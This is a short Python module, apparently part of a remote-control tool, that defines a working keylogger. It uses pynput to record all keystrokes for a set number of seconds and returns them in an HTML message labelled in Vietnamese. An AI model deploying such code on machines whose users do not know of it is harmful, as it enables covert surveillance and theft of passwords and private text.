import time
from pynput.keyboard import Listener, Key
from .html_generator import HTML_Generator
from threading import Thread
key_log = ''
listener = None

def countdown(t,callback):
    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r")
        time.sleep(1)
        t -= 1
    callback()

def on_press(key):
    global key_log
    try:
        key_log += key.char
    except AttributeError:
        if key == Key.enter:
            key_log += 'Enter\n'

def listening_keyboard_start():
    global key_log
    global listener
    if listener is None:
        key_log = ''
        listener = Listener(on_press=on_press)
        listener.start()
def listening_keyboard_stop():
    global listener
    if listener:
        listener.stop()
        listener = None
class KeyLogger:
    def __init__(self):
        pass
    def __key_log(self,timer):
        listening_keyboard_start()
        countdown(int(timer),listening_keyboard_stop)
        return key_log
    def get_key_log(self,params):
        html = HTML_Generator.html_msg(
            "Nội dung gõ phím trong "+str(params[0])+" giây là: "+self.__key_log(params[0]),None,True)
        return {
            'html': html,
            'data': None
        }